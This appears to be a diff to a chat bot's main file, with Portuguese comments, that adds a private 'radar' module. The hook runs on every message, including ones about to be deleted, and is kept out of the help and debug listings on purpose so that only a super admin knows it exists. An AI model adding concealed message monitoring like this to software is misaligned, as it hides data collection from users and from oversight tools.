@@ -23,6 +23,7 @@ import * as autorole  from "./modulos/ferramentas/autorole.js";
 import * as bemvindo  from "./modulos/ferramentas/boas-vindas.js";
 import * as fuso      from "./modulos/ferramentas/fuso.js";
 import * as ttsVoz    from "./modulos/ferramentas/tts.js";
+import * as radar     from "./modulos/ferramentas/radar.js";   // vigia privado (fora de rotas: não aparece em help/config/debug)
 import * as staff     from "./modulos/moderacao/staff.js";
 import * as tutorial   from "./modulos/moderacao/tutorial.js";
 import * as corCargo   from "./modulos/moderacao/cor-cargo.js";
@@ -612,6 +613,21 @@ client.on("messageCreate", async (message) => {
   const serverId = message.serverId ?? message.server?.id ?? message.server?._id ?? null;
   srvStats.registrar(serverId);   // métrica de ritmo (memória, janela deslizante)
   const ctx = criarContexto(serverId);
+
+  // ── Radar privado ──
+  //
+  //  Fica FORA de `rotas` de propósito: `&debug` enumera `Object.keys(rotas)`
+  //  e o `&help` lê a mesma lista, então registrar o comando ali o tornaria
+  //  visível. Despachado aqui, ele só existe para quem é super admin; para
+  //  qualquer outra pessoa `&radar` cai no "comando desconhecido" de sempre.
+  try { if (await radar.talvezComando(message, { ...ctx, client })) return; }
+  catch (e) { console.error("[RADAR]", e?.message ?? e); }
+
+  // O encaminhamento fica AQUI EM CIMA, antes do automod e do roteador, para
+  // ver mesmo a mensagem que vai ser apagada em seguida — um golpe que se
+  // passa pelo Vapor Nexus é justamente o que interessa ver. Não bloqueia
+  // nada: roda em background e nunca lança.
+  radar.aoMensagem(message, { ...ctx, client }).catch(() => {});
 
   // Identifica se a mensagem é um COMANDO reconhecido
   let command = null, args = [];
